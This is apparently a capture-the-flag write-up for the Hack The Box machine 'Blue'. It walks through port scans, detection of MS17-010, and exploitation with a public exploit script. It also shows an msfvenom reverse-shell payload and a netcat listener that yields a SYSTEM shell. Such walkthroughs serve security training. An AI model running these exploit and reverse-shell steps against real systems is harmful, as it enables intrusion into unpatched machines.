# Blue

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.40]
└─# nmap -p- --min-rate 5000 -Pn 10.10.10.40 -oN all_ports.nmap                                                   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 08:03 EDT
Nmap scan report for 10.10.10.40
Host is up (0.17s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.54 seconds

```

Full port scan reveals port 135, 139 and 445 are open. Ports 49xxx are high RPC ports.

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.40]
└─# nmap -p 135,139,445 -A --min-rate 5000 -Pn 10.10.10.40 -oN aggr.nmap  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 08:04 EDT
Nmap scan report for 10.10.10.40
Host is up (0.17s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 8.1 (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m57s, deviation: 34m37s, median: 1s
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-04-22T13:04:16+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-04-22T12:04:17
|_  start_date: 2023-04-22T12:02:12

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   170.18 ms 10.10.14.1
2   170.14 ms 10.10.10.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.91 seconds

```

Aggressive port scan reveals that the victim is running WIndows 7.

### Vuln to MS17-010

Using nmap vuln script scan, it is evident that the victim is vulnerable to MS17-010.

```bash
┌──(root㉿kali)-[/home/kali/Documents/htb/10.10.10.40]
└─# nmap -p 139,445 --script vuln 10.10.10.40                           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 08:05 EDT
Nmap scan report for 10.10.10.40
Host is up (0.17s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 27.75 seconds
```

### Exploiting MS17-010

```bash
git clone https://github.com/worawit/MS17-010.git
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe > shell.exe
```

Inside `zzz_exploit.py,`

<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption><p>Edited zzz_exploit.py</p></figcaption></figure>

Using Null Session SMB creds:

```bash
┌──(root㉿kali)-[/home/…/Documents/htb/10.10.10.40/MS17-010]
└─# python2 zzz_exploit.py 10.10.10.40 
Target OS: Windows 7 Professional 7601 Service Pack 1
Not found accessible named pipe
Done
```

Using SMB Guest account:

* Inside `zzz_exploit.py`,

<figure><img src="../../.gitbook/assets/image (180).png" alt=""><figcaption><p>Edited zzz_exploit.py</p></figcaption></figure>

```bash
┌──(root㉿kali)-[/home/…/Documents/htb/10.10.10.40/MS17-010]
└─# python2 zzz_exploit.py 10.10.10.40 
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: browser
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa800469d020
SESSION: 0xfffff8a0091f1b20
FLINK: 0xfffff8a001361048
InParam: 0xfffff8a0080f315c
MID: 0x3007
unexpected alignment, diff: 0x-6d92fb8
leak failed... try again
CONNECTION: 0xfffffa800469d020
SESSION: 0xfffff8a0091f1b20
FLINK: 0xfffff8a0080ff088
InParam: 0xfffff8a0080f915c
MID: 0x3103
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Opening SVCManager on 10.10.10.40.....
Creating service Hhkm.....
Starting service Hhkm.....
The NETBIOS connection with the remote host timed out.
Removing service Hhkm.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done

```

```bash
┌──(root㉿kali)-[/home/…/Documents/htb/10.10.10.40/MS17-010]
└─# nc -lvp 443
listening on [any] 443 ...
10.10.10.40: inverse host lookup failed: Unknown host
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.40] 49159
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```
